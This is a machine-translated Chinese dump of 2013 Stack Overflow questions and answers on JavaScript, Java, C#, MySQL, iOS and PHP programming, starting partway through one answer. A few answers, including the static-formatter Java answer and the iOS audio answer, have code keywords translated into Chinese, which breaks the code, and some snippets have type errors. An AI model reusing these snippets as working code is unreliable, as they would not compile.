alert(date2.getMinutes() % 5 == 0);  // alerts "false" 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-09T10:43:18.187

```
<?php
date_default_timezone_set('Asia/Kolkata');
$now=time();
$minute=date('i',$now);
if($minute>0)
{
    if($minute%5==0)
        echo 'true'.date('H:i',$now);
    else
        echo 'false'.date('H:i',$now);
}
else
{
    echo 'true'.date('H:i',$now);
}
?> 
```

# c# - Excel 文件未在 IIS 中打开

> ID：15899462
> 
> 赞同：0
> 
> 时间：2013-04-09T10:27:02.437
> 
> 标签：c#, iis, iis-6

当我将我的 Web 应用程序添加到 IIS 时，我无法打开 Excel。即使我给了文件夹的所有权利（在 dcomcnfg 中）。我也几乎尝试了所有在谷歌中给出的东西。但它在本地主机中工作。

```
string excelPath = Convert.ToString(FileUpload1.PostedFile.FileName);
        object missing = System.Reflection.Missing.Value;
        Excel.Application xlApp = new Excel.ApplicationClass();
        Excel.Workbook xlWorkBook;
        try
        {
            xlWorkBook = xlApp.Workbooks.Open(@excelPath, missing, missing, missing, missing, missing, missing, missing, missing, missing, missing, missing, missing, missing, missing);
            xlApp.Visible = true;
            xlApp.DisplayAlerts = false;
            xlWorkBook.Activate();
        }
        catch (Exception ex)
        {
            lblPath.Text = ex.Message.ToString();
        } 
```

如果我从 C 盘选择文件，它会显示错误，例如 -> 'C:\Users\vino\Desktop\sample.xlsx' 找不到。检查文件名的拼写，并验证文件位置是否正确。如果您尝试从最近使用的文件列表中打开该文件，请确保该文件未被重命名、移动或删除。

如果我从 D 盘选择文件，成功完成，但 Excel 没有打开。

我需要给文件夹任何特定（imp）权限吗？

# java - Java - 可以将私有字段值传递给另一个类的方法吗？

> ID：15899468
> 
> 赞同：6
> 
> 时间：2013-04-09T10:27:24.650
> 
> 标签：java, class, parameter-passing, field, private-members

我有一个包含一堆字段的类，所有字段都是私有的（子类使用受保护的 getter 访问一些）。我需要将这些字段中的大部分传递到另一个类中的方法中，该方法将格式化它们并生成输出。在类中有一个方法可以传递它们的字段吗？或者这些情况是否表明我应该在两个类之间实现一些其他关系，因为它们看起来因此紧密耦合？

更多信息：A 类代表雇员，B 类的唯一职责是格式化程序的输出。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-09T10:32:15.970

您是在问是否可以执行以下操作？

```
public class A {
 private B myB = new B();
 private String myUnformattedName = "some information";

 public String getFormattedInfo() {
   return myB.formatInfo(myUnformattedName);
 }
} 
```

这完全没问题。

[将字段标记为私有只是意味着只有包含类应该能够访问它......](http://docs.oracle.com/javase/tutorial/java/javaOO/accesscontrol.html)

如果你的意思是别的，最好在你的问题中弹出一些代码给人们上下文

* * *

好的，因此无法在此处设置值，但您可以在此处看到两种不同的调用格式化程序的方法。当参数列表超过三个或四个项目时，就会变得难以阅读。

在这种情况下，我只需将 A 传递给格式化程序，并为您希望 B 能够读取的每个值都有一个 get 方法。

```
public class A {
 private B myB = new B();
 private String myUnformattedName = "some information";
 private String myUnformattedNameOne = "some information";
 private String myUnformattedNameTwo = "some information";
 private String myUnformattedNameThree = "some information";
 private String myUnformattedNameFour = "some information";
 private String myUnformattedNameFive = "some information";
 private String myUnformattedNameSix = "some information";

 public String getFormattedInfo() {
   //pass the object itself and use get methods
   return myB.formatInfo(this); 
 }

 public String getFormattedInfoLong() {
   //this is OK but gets difficult to read the longer the 
   //parameter list gets
   return myB.formatInfo(myUnformattedName, myUnformattedNameOne, 
      myUnformattedTwo, myUnformattedNameThree, myUnformattedNameFour,
      myUnformattedNameFive, myUnformattedNameSix); 
 }

 //getters
 public String getUnformattedName() {
    return myUnformattedName;
 }

 public String getUnformattedNameOne() {
    return myUnformattedNameOne;
 }

 //etc

} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-09T10:34:51.203

我实际上建议使用访客模式。

A 类有一个接受访问者的方法，而访问者又具有一个定义良好的公共方法，例如：

首先，被访问的类允许某些具有良好定义接口的类进入，不会将自己的数据传递给外部。

```
public class A {
    int data;

    public void getFormattedBy(Formatter f) {
       f.format(data);
    }
} 
```

访问者的界面，允许多个格式化程序

```
public interface Formatter {
    void format (int data);
} 
```

一个格式化程序，允许进入访问的类。

```
public class B implements Formatter {
    public void format(int data) {
        // do the formatting and printing
    }
} 
```

这样你只需调用

```
A a = new A();
B b = new B(); // the formatter
a.getFormattedBy(b); 
```

最后，访问者（格式化程序）可以访问许多允许访问者进入的类（可能通过自己实现接口），并且访问的类可以被许多访问者访问。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-09T10:30:57.783

我认为传递它们是完全可以的，只要它们具有原始类型或不可变。

如果被调用者可以在不应该修改它们时修改它们，那么您就有设计问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-09T10:30:46.297

只要 B 类不修改它们就可以了。如果该类确实这样做，请将不可变实例传递给它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-09T10:31:16.583

您可以使 B 类成为实用程序类并仅在其上具有静态方法。

然后在您的 A 类中，您可以拥有以下内容：

公共字符串 formatMyVariables() {

返回 B.format(a,b,c,d);

}

我假设你提到的输出是一个字符串，但它实际上可以是任何东西。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-09T10:31:43.057

您应该考虑如果您的`Employee`字段是原始值（`int`, `boolean`）或不可变的（`String`例如），那么您可以让其他类读取它们而不必担心。

保护字段`private`是不暴露对象内部工作的方法，只能通过其`public`API 访问。但是，当您的类真正代表一个业务对象（即一组标识实体的值）时，让其他人读取内部字段是完全安全的。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-04-09T10:32:02.200

传输数据的最佳方式是 DTO 对象。

这些对象仅包含实例变量（带有 setter 和 getter）作为您要传输的数据！

此类中不应有任何行为

例如，如果要传递 Employee 数据，请执行以下操作

```
class EmployeeBean
{
private String name;
private String age;

public void setName(String n)
{
name=n;
}

public String getName()
{
return name;
}

public void setAge(int n)
{
age=n;
}

public int getAge()
{
return age;
}

} 
```

您现在可以创建 EmployeeBean 类，在其实例变量中填充数据，然后将此对象作为参数传递给另一个可以对其进行格式化的类中的方法

# html - Twitter Bootstrap 图标或 ASCII 代码中的货币代码

> ID：15899472
> 
> 赞同：3
> 
> 时间：2013-04-09T10:27:42.033
> 
> 标签：html, twitter-bootstrap, icons, ascii, symbols

我正在 twitter bootstrap 中建立一个电子商务网站，我想在其中使用**货币符号/图标**。我必须选择替代方案，用**ascii 代码**编写货币代码，其次是通过 twitter 引导图标，我在其中创建自己的 css 到特定图标并嵌入它的图像......

由于我想要所有国家的所有货币代码，特别是**印度卢比**，我用什么方式来做这个，我认为印度卢比不在 ascii 代码中，所以我想使用它的图标，但我也找不到图标或一组图标，所有图标都在一个地方，有人可以建议我该怎么做吗？

通过使用 twitter 引导图标，我只需添加：-

```
<i class="icon-rupee"></i>
<i class="icon-dollar"></i>
<i class="icon-yen"></i>
<i class="icon-euro"></i>
and so on... 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T18:34:14.450

我不知道*免费*的货币符号 Webfont，但您可以在 HTML 中使用 ₹`&#8377;`或`&#8360;`₨ 来显示印度卢比符号，这应该适用于大多数现代操作系统。

您可以找到其他货币符号 f.ex。[在此 PDF 中](http://www.unicode.org/charts/PDF/U20A0.pdf)并在 HTML 中对其进行解码。

**编辑：**[Font Awesome](http://fontawesome.io/icons/#new) 的新版本 3.2.0现在支持[卢比符号](http://fontawesome.io/icon/inr/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-28T05:46:25.787

为此，我刚刚使用了一些工具和资产来为此制定一个良好而简单的解决方案......

我从[Free Icon Set](http://www.gentleface.com/free_icon_set.html)中获取的用于货币的图标，并使用[Jasny Bootstrap获取](http://jasny.github.io/bootstrap/index.html)[Twitter Bootstrap](http://twitter.github.com/bootstrap/)的一些附加功能和图标......

对于**美元符号**，我写了这个 css：-

```
.icon-dollar {
    background-image: url("../images/cur_dollar_icon&16.png");
} 
```

并为所有**自定义货币图标**。我已经写了：-

```
.icon-bp, .icon-dollar, .icon-euro, .icon-yen, .icon-rupee {
    background-position: center center;
    height: 16px;
    position: relative;
    top: -1px;
    width: 16px;
} 
```

**html为：-**

```
<i class="icon-dollar"></i> 
```

所以你可以添加简单和许多图标，谢谢...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-21T11:09:20.987

标准 UTF8 支持卢比，并且所有默认字体系列（Ariel、Currier、Times New Roman、San Serif 等）只要确保您的标头符合 UTF 并使用“\u20b9”应该转义为您的符号。

# javascript - javascript函数中的数组

> ID：15899473
> 
> 赞同：-2
> 
> 时间：2013-04-09T10:27:56.997
> 
> 标签：javascript, asp.net, arrays

我有一个带有文本**"09-45"**的标签。如何在 2 个单独的标签中获取文本**09**和**45 ？**我需要在 javascript 函数中使用它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:31:38.723

例如：

```
var str = "09-45";
var spl = str.split("-");
var first = spl[0];
var second = spl[1]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:30:36.287

通过使用`.split`？

```
var string = "string-split";
var arrayPieces = string.split('-');
alert(arrayPieces[1]); // Output: split 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-09T10:30:45.537

用于`a = myvar.split("-");`将字符串拆分为字符串数组。
然后`a[0]`将包含“09”`a[1]`并将包含“45”；

# javascript - 使用 Javascript 动画处理图像的褪色

> ID：15899474
> 
> 赞同：0
> 
> 时间：2013-04-09T10:28:03.207
> 
> 标签：javascript, image, function, fadein

当您将鼠标悬停在图像上时，我目前有以下代码可以在图像上添加叠加层：

```
<script>
    function toggleOverlay(name, newState){
        var element = 'imgOverlay' + name;
        var newDisplay

        if (newState == 0) {newDisplay = 'none'}
        if (newState == 1) {newDisplay = 'block'}          

        document.getElementById(element).style.display = newDisplay;
        //document.getElementById(element).style.z-index = '5';
    }

    function clearOverlays(){
        toggleOverlay('SteBes',0);
        toggleOverlay('VicGun',0);
        toggleOverlay('SteFry',0);
        toggleOverlay('DomSag',0);
        toggleOverlay('DenCro',0);
        //toggleOverlay('UnkOne',0);
        //toggleOverlay('UnkTwo',0);
        toggleOverlay('SteWoz',0);
    }
</script> 
```

我怎样才能淡入叠加层，因为它突然改变了？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:36:23.773

这是带有 CSS3 的 Javascript 示例

[http://jsfiddle.net/sLNqm/](http://jsfiddle.net/sLNqm/)

请转到以下链接有 jquery 示例示例

[http://api.jquery.com/fadeIn/](http://api.jquery.com/fadeIn/)

```
$(document.body).click(function () {
  $("#DivName").fadeIn("slow");
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:31:14.427

为什么不使用 JQuery？您可以开箱即用。

# groovy - 如何使用 groovy 更快地连接到 jmx

> ID：15899475
> 
> 赞同：5
> 
> 时间：2013-04-09T10:28:04.963
> 
> 标签：groovy, jmx

我使用 weblogic 示例：[http](http://groovy.codehaus.org/Groovy+and+JMX) ://groovy.codehaus.org/Groovy+and+JMX将 jmx 与 groovy 连接

问题是连接时间太长：

```
 long time = System.currentTimeMillis();

    println System.currentTimeMillis() - time;
    def server = JMXConnectorFactory.connect(serviceURL, h).MBeanServerConnection
    println System.currentTimeMillis() - time; 
```

我有大约 200 个 groovy 脚本。每个脚本都在做其他事情，但都需要连接到 jmx。当我想执行所有操作时，大约需要一个小时甚至更多时间。是否有一些选择如何更快地做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T07:46:41.443

所以答案非常简单。我需要使用这个项目： http: [//kobo.github.io/groovyserv/](http://kobo.github.io/groovyserv/)

然后我刚刚`JmxSharedConection`使用静态方法创建了类，在其中添加了连接，现在它的工作速度要快得多

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T15:59:02.580

我会采纳 tim 的建议并将共享连接实现为 [同步] 单例。因此，实际上，您只需建立一次连接，然后每个脚本都会根据需要使用它。对于一些额外的 pizass，向您的[JMXConnection注册一个](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/remote/JMXConnector.html)[连接侦听](http://docs.oracle.com/javase/1.5.0/docs/api/javax/management/remote/JMXConnector.html#addConnectionNotificationListener%28javax.management.NotificationListener,%20javax.management.NotificationFilter,%20java.lang.Object%29)器，当连接丢失时，启动一个重新连接循环，向调用脚本抛出异常，直到您重新连接。

# javascript - javascript中的字符串格式化

> ID：15899477
> 
> 赞同：0
> 
> 时间：2013-04-09T10:28:23.827
> 
> 标签：javascript, jquery, arrays

我有一个字符串，可以说'C1 AND C2 OR C3 (~!@#$%) AND C4 OR C5'......现在我实际上已经将它拆分并保存在一个数组（inArray）中，即

```
function removeCondition(condition,input){
    //Condition is the String ie(C1 And C2) and input is the suffix no ie (3 for C3)
    condition = condition.replace(new RegExp("\n","g")," ");
    var inArray = condition.split(' ');
    var conditionRemoved = false;

    inArray.forEach(function(v,i,a){
        if(v.indexOf("C"+input) > -1){
            if(i+2 < a.length){
                //some function i want

                //inArray.splice(i,2);
            }
            else{
                inArray.splice(i-1,2);
            }
            inArray.join(' ');
        }
    }
}//editor: added this bracket to balance the closing brackets 
```

当我想要所需的条件时，上述`if()`条件得到满足，即在这种情况下`C3`..现在我想删除`C3`下一个运算符（可以是 OR/AND）以及介于两者之间的所有垃圾......所以对于上面的例子我的输出必须是`C1 AND C2 OR C4 OR C5`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T12:12:10.440

我仍然不确定您的问题，但由于您正在跟进您的问题，这段代码可能会给您一个起点

```
var conditions = 'C1 AND C2 OR C3 (~!@#$%) AND C4 OR C5';
var filtered = conditions.replace(/c3((?!and|or).)*(and|or)/gi, '');

//output: C1 AND C2 OR  C4 OR C5 
```

我希望您可以在您的函数中使用给定的（硬编码）工作解决方案并获得所需的输出。

# javascript - 指定 infoVis JIT 图中节点之间的最小距离

> ID：15899478
> 
> 赞同：1
> 
> 时间：2013-04-09T10:28:28.527
> 
> 标签：javascript, canvas, graph-visualization, infovis, thejit

有什么方法可以指定力有向图中的节点/边之间的最小距离？

我有一些图表，其中一个节点直接连接到数百个其他节点，在这种情况下，很难选择特定的边或节点，因为边和节点非常接近以至于 onMouseEnter ， onClick 等事件不会被触发用户期望它是。

例如，如果 nodeA 和 nodeB 非常接近，当我将鼠标悬停在 nodeA 上并希望它突出显示时，会突出显示 nodeB，因为为 nodeB 触发了事件。当它们彼此太靠近时，边缘的情况也是如此。基本上，用户很难知道究竟是哪个节点/边缘被悬停或选择。

我知道我们可以指定边长。这可以在一定程度上解决这个问题，但是当你有数百个节点和边时它就无济于事了。而且我不能将边缘长度设置为超过画布的高度。

如果我们可以指定节点/边之间的最小距离，那将非常有用。

有谁知道怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T15:19:54.450

作为[InfoVis/TheJit API 文档](http://philogb.github.io/jit/static/v20/Docs/files/Graph/Graph-js.html#Graph.Util.eachNode)，有一个`.eachNode()`函数允许您遍历所有节点并检索它们的数据。

```
$jit.Graph.Util.eachNode( graph, function( node ) {  
   console.log( node );
} );  
// or:
graph.eachNode( function( node ) {  
    console.log( node );
} ); 
```

由于我已经一年多没有使用 InfoVis/TheJit 并且目前没有设置项目，我不知道您是否可以使用[`Graph.Node.getPos()`](http://philogb.github.io/jit/static/v20/Docs/files/Graph/Graph-js.html#Graph.Node.getPos). 无论如何，如果你想出了这一步，你就必须写一个对象/数组/矩阵来保持这个位置。如果某个 el 靠近另一个 el，您将使用[`Graph.Node.setPos()`](http://philogb.github.io/jit/static/v20/Docs/files/Graph/Graph-js.html#Graph.Node.setPos)它来重新定位它。

# mysql - 如果唯一键很长，则将 MISAM 表转换为 INNODB

> ID：15899479
> 
> 赞同：1
> 
> 时间：2013-04-09T10:28:32.740
> 
> 标签：mysql, innodb, myisam

由于MYISAM每次都会锁定完整的表，我正在考虑将我的MYISAM表转换为InnoDB。但是，INNODB 要求唯一键和主键在 767 字节内。

所以，我收到了这个错误：-

```
#1071 - Specified key was too long; max key length is 767 bytes 
```

我的唯一键有点长。那么，我将表转换为 INNODB 的最佳方法是什么？

这是描述我的桌子的屏幕截图

![在此处输入图像描述](https://i.stack.imgur.com/N4v5a.png)

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T04:33:17.213

假设您在屏幕截图中看到的键就是您所拥有的，那么这里有问题的键是`query_id`. 作为 300 个字符的 UTF8 列，它最终仅使用 900 个字节。

您需要将索引限制为该列的一部分——比如说，可能是前 100 个字符？

```
DROP INDEX query_id ON tablename
CREATE INDEX query_id ON tablename (query_id, position, prod(100)) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-11T21:51:54.090

在转换表之前，调整其顺序，使主键列有序

```
> ALTER TABLE tablename ORDER BY 'primary_key_column'; 
```

这将预先排列表格，以便可以快速转换它，而无需在 MySQL 中进行大量重新排列。然后，只需更改表引擎：

```
> ALTER TABLE tablename ENGINE = INNODB; 
```

# image - 如何在单个 XML 调用中下载多个图像？

> ID：15899481
> 
> 赞同：4
> 
> 时间：2013-04-09T10:28:40.843
> 
> 标签：image, download

我正在开发一个 iPhone 应用程序，我需要在 for 循环中使用图像 url 从服务器下载 100-200 张图像。如下所示：

```
 NSOperationQueue *queue = [NSOperationQueue new];
        NSInvocationOperation *operation = [[NSInvocationOperation alloc] initWithTarget:self
                                                                                selector:@selector(downloadImages:)
                                                                                  object:arrayTemp];
        [queue addOperation:operation];
        [operation release];
        [queue release];

-(void)downloadImages{

NSAutoreleasePool *pool = [[NSAutoreleasePool alloc]init];
UIImage *image;
for (int i=0; i < [self.ImagesRecords count]; i++)
{
    ImageData *data =(ImageData*) [self.ImagesRecords objectAtIndex:i];
    NSString *strName = [NSString stringWithFormat:@"image_%@",data.ID];
    image = [UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:[@"http://abc.com" stringByAppendingString:data.PhotoPath]]]];
    if (image!=nil)
    {
        [self saveImage:image withName:strName];
    }
}
image = nil;
[pool release];
} 
```

它工作正常，也给了我形象。

我的问题是：

1.  如何在单个 XML 调用中获取多个图像数据？可能吗？
2.  下载图像的最佳方式是什么？请提供一段代码。
3.  有时我发现我的应用程序在此图像下载过程中卡住了一段时间。它的原因是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-14T18:00:41.227

1.  1个xml中的多个图像示例：

```
<xml>
    <info>
        <width>55</width>
        <height>41</height>
    </info>
    <image_data>
        <data>
            <name>Background</name>
            <data>data:image/png;base64,iVBORw0KGgoAAA...</data>
        </data>
        <data>
            <name>Layer #2</name>
            <data>data:image/png;base64,iVBORw0KGgoAAAANS...</data>
        </data>
        <data>
            <name>Layer #3</name>
            <data>data:image/png;base64,iVBORw0KGgoAAAANSUh...</data>
        </data>
    </image_data>
</xml> 
```

# java - 例外：已经连接，HttpsUrlConnection

> ID：15899482
> 
> 赞同：1
> 
> 时间：2013-04-09T10:28:41.313
> 
> 标签：java, https, httpsurlconnection

我正在尝试与 URL 建立 https 连接。我得到了这个例外

> 例外：已连接

我不确定我们如何通过 java 创建安全连接。谁能帮我这个？

这是我的代码。

```
public static String getCon() {
    String result="",cookie="";
    System.setProperty("java.protocol.handler.pkgs", "com.sun.net.ssl.internal.www.protocol");
    java.security.Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider()); 
try {
URL url= new URL("https://jazz.net/");
HttpsURLConnection connection= (HttpsURLConnection) url.openConnection();
String cookieHeader = connection.getHeaderField("set-cookie");
if (cookieHeader != null) {
    int index = cookieHeader.indexOf(";");
    if (index >= 0)
        cookie = cookieHeader.substring(0, index);
    connection.setRequestProperty("Cookie", cookie);
}connection.setDoInput(true); 
connection.setDoOutput(true);
connection.setRequestMethod("POST"); 
connection.setFollowRedirects(false);

connection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
connection.setRequestProperty("Accept", "application/xml");
connection.setRequestProperty("User-Agent", "yes");
DataInputStream input = new DataInputStream( connection.getInputStream() ); 

StringBuffer buf= new StringBuffer();
// read in each character until end-of-stream is detected 
for( int c = input.read(); c != -1; c = input.read() ) 
    buf.append(c);
input.close(); 
result=buf.toString();
} catch (Exception e) {
// TODO Auto-generated catch block
return result+" exception "+e.getMessage();
 }

    return result;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T22:50:45.450

您甚至在连接之前就获得了 Set-Cookie 标头。没有任何意义。如果您想在请求中设置该标头，只需设置它。getHeader() 从*响应中获取标头。*

# iphone - 如何在 iPhone 中录制 mp3 格式的声音

> ID：15899488
> 
> 赞同：1
> 
> 时间：2013-04-09T10:28:56.750
> 
> 标签：iphone, ios, mp3, avaudioplayer, audio-recording

我想在我的 iPhone 应用程序中录制声音，但我只能以某些特定格式录制。如何以 mp3 格式录制我已经搜索了很多，但找不到解决方案

我发现 AVRecorder 不支持 mp3 录制，尽管 iTunes 中有很多应用程序以 mp3 格式录制

我怎样才能做到这一点，请帮助我..提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T12:07:09.167

NSString *path = [[NSBundle mainBundle] pathForResource:@\"mp3Header\" ofType:@\"mp3\"];

NSMutableData *audioData = [[NSMutableData alloc] initWithContentsOfFile:path];

整数样本 = 22050；

uint8_t 数据记录[样本]；

诠释 x;

for(x = 0; x < 样本; x++) {

```
// populate the \"dataToRecord\" array with audio data. // 
```

}

[audioData appendBytes:(const void *)dataToRecord length:samples];

```
// Get path to documents folder and set a file name  // 
```

[audioData writeToFile:pathToFile atomically:YES];

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T12:48:59.763

[这](http://developer.apple.com/library/ios/#samplecode/SpeakHere/Introduction/Intro.html)是您问题的解决方案。

此演示由 Apple 开发，可用于 mp3 格式的音频录制。我已经使用这个演示开发了一个应用程序（ [BRL App ）。](https://itunes.apple.com/cn/app/battleraplive/id346512771?mt=8)

这是苹果开发人员开发的非常有用的演示。

# java - java - 如果进程超过分配的时间，如何杀死它

> ID：15899489
> 
> 赞同：1
> 
> 时间：2013-04-09T10:28:57.217
> 
> 标签：java, multithreading, timeout, runnable

我想知道如果进程超过预定义的时间，最好的方法是检测/杀死进程。我知道一种旧方法是使用 ant 包中的 watchdog/timeoutobserver 类。但这现在已被弃用，所以我想知道现在应该怎么做？

这是我使用看门狗的代码：

```
import org.apache.tools.ant.util.Watchdog;
import org.apache.tools.ant.util.TimeoutObserver;

public class executer implements TimeoutObserver {

    private int timeOut = 0;
    Process process = null;
    private boolean killedByTimeout =false;

    public executer(int to) {
        timeOut = t;
    }

    public String executeCommand() throws Exception {
        Watchdog watchDog = null;
        String templine = null;
        StringBuffer outputTrace = new StringBuffer();
        StringBuffer errorTrace = new StringBuffer();

        Runtime runtime = Runtime.getRuntime();

        try {
            //instantiate a new watch dog to kill the process
            //if exceeds beyond the time
            watchDog = new Watchdog(getTimeout());
            watchDog.addTimeoutObserver(this);
            watchDog.start();

            process = runtime.exec(command);

            //... Code to do the execution .....

            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            bufferedReader = new BufferedReader(inputStreamReader);
            while (((templine = bufferedReader.readLine()) != null) && (!processWasKilledByTimeout)) {
                outputTrace.append(templine);
                outputTrace.append("\n");
            }

            this.setStandardOut(outputTrace);

            int returnCode = process.waitFor();
            //Set the return code
            this.setReturnCode(returnCode);

            if (processWasKilledByTimeout) {
                //As process was killed by timeout just throw an exception
                throw new InterruptedException("Process was killed before the waitFor was reached.");
            }

        } finally {
            // stop the watchdog as no longer needed.
            if (aWatchDog != null) {
                aWatchDog.stop();
            }
            try {
                // close buffered readers etc
            } catch Exception() {
            }
            //Destroy process
            //    Process.destroy() sends a SIGTERM to the process. The default action
            //    when SIGTERM is received is to terminate, but any process is free to
            //    ignore the signal or catch it and respond differently.
            //
            //    Also, the process started by Java might have created additional
            //    processes that don't receive the signal at all.
            if(process != null) {

                process.destroy();
            }
        }

        public void timeoutOccured(Watchdog arg0) {
            killedByTimeout = true;

            if (process != null){
                process.destroy();
            }
            arg0.stop();
        }

    }
} 
```

任何帮助将不胜感激，因为我有点失落。我正在尝试将其升级到 Java 7，但如果它挂起超过分配的时间，我还没有掌握杀死它的最佳方法。

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:55:31.037

尝试

```
 final Process p = ... 
    Thread t = new Thread() {
        public void run() {
            try {
                Thread.sleep(1000);
                p.destroy();
            } catch (InterruptedException e) {
            }
        };
    };
    p.waitFor();
    t.interrupt(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:35:14.807

从理论上讲，线程具有`stop()`完全杀死线程的方法。从 java 1.1 开始不推荐使用此方法，因为它可能导致资源泄漏。所以，真的不建议你使用它。

“正确”的解决方案是实现您的线程，以便它们在收到特殊“信号”时可以优雅地退出。您可以使用“中断”机制：您的看门狗应该调用超过时间限制的线程的“interrupt()”。但是线程应该调用`isInterrupted()`自己并在被中断时退出。好消息是该方法喜欢`sleep()`并且`wait()`已经支持它，因此如果您的线程正在等待并且您从外部中断它，`InterruptedException`它将被抛出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:41:12.203

如果你只是关心`WatchDog`它本身被弃用了，那么你使用它并没有什么困难，过一段时间`TimerTask`再做。`process.destroy()`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:42:32.127

我写了一组`ExecutorServices`在给定一段时间执行后将取消进程的方法。此代码已签入 GitHub。

用于创建的类`ExecutorService`是[CancelingExecutors](https://github.com/dancerjohn/LibEx/blob/master/libex/src/main/java/org/libex/concurrent/cancelling/CancelingExecutors.java)。主要有两个类：

*   [CancelingListeningExecutorService](https://github.com/dancerjohn/LibEx/blob/master/libex/src/main/java/org/libex/concurrent/cancelling/CancelingListeningExecutorService.java)允许您指定每个通过的超时时间`Callable`
*   [FixedTimeoutCancelingListeningExecutorService](https://github.com/dancerjohn/LibEx/blob/master/libex/src/main/java/org/libex/concurrent/cancelling/FixedTimeoutCancelingListeningExecutorService.java)配置为对所有`Callables`

# javascript - 由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“*** setObjectForKey：对象不能为零（键：cordova）”

> ID：15899490
> 
> 赞同：0
> 
> 时间：2013-04-09T10:28:59.313
> 
> 标签：javascript, iphone, extjs, sencha-touch, sencha-touch-2

我正在研究煎茶触摸。我重置了模拟器，然后应用程序崩溃并显示错误

```
Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '*** setObjectForKey: object cannot be nil (key: cordova)' 
```

我不明白那是什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T10:30:41.643

您已经`nil`为 a 中的键 ( `cordova`)设置了一个对象`NSMutableDictionary`。此操作是非法的，因此会引发此异常。在设置之前检查您的对象。

# php - swiftmailer 联系表必填字段

> ID：15899507
> 
> 赞同：0
> 
> 时间：2013-04-09T10:29:54.633
> 
> 标签：php, forms, validation, swiftmailer

我在一个由 swiftmailer 处理的网站上建立了一个联系表格。目前，它使用图像附件和一些输入字段正确发送。我如何将某些字段设为“必填”并在这些字段留空时输出错误消息？这是在 swiftmailer 库进入之前需要发生的事情吗？

抱歉，如果这是简单的东西，但我是 PHP 新手，并且无法在任何地方找到快速答案

```
<?php

$_SESSION["post"] = $_POST; 
$name = $_POST["Name"]; $email = $_POST["Email"]; $phone = $_POST["Phone"]; $dob = $_POST['DOBDay'] ."\t" .$_POST['DOBMonth'] ."\t" .$_POST['DOBYear'];$address = $_POST['AddressLine1'] ."\n" .$_POST['AddressLine2'] ."\n" .$_POST['PostCode'];$experience = $_POST["Experience"];$height = $_POST["Height"]; $size = $_POST["DressSize"];$bra = $_POST["Bra"];$waist = $_POST["Waist"];$hipwidest = $_POST["HipWidest"];$bicep = $_POST["Bicep"];$thigh = $_POST["Thigh"];$shoe = $_POST["Shoe"];    

require_once 'lib/swift_required.php';

// Create the Transport
$transport = Swift_SmtpTransport::newInstance('smtp.gmail.com', 465, "ssl")
->setUsername('xxx@gmail.com')
->setPassword('xxx');

// Create the Mailer using your created Transport
$mailer = Swift_Mailer::newInstance($transport);

// Create a message
$message = Swift_Message::newInstance('Be A Model application: Girls') 

// Set the From address with an associative array
->setFrom(array($email => $name))

// Set the To addresses with an associative array
->setTo(array('xxx@xxx.com', 'xxx@xxx.com' => 'contact test'))

// Give it a body
->setBody('Name: ' .$name ."\n"
.'Email: ' .$email ."\n"
.'Phone: ' .$phone ."\n"
.'Address: ' .$address ."\n"
.'DOB: ' .$dob ."\n"
.'Experience: ' .$experience ."\n"
.'Height: ' .$height ."\n"
.'Dress Size: ' .$size ."\n"
.'Bra: ' .$bra ."\n"
.'Waist: ' .$waist ."\n"
.'Hip at Widest: ' .$hipwidest ."\n"
.'Bicep: ' .$bicep ."\n"
.'Thigh: ' .$thigh ."\n"
.'Shoe Size: ' .$shoe ."\n" );

// And optionally an alternative body
//->addPart('<q>Here is the message itself</q>', 'text/html');

// Attachment  
$message->attach(
Swift_Attachment::fromPath($_FILES['fileatt']['tmp_name'])->setFilename($_FILES['fileatt']['name'])
);

// Send the message
$result = $mailer->send($message);

if ($result)
{
header('Location: http://www.modelmeasures.co.uk/thankyou.html');
}
echo $result;

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-13T07:14:52.043

网站的数据验证有两种类型，客户端和服务器端。

客户端验证 - 这种类型的验证通常使用 javascript 完成，通常在您完成表单时完成。您已经在提交之前在无效表单字段旁边显示“X”或将字段颜色变为红色的网站上看到了这一点。

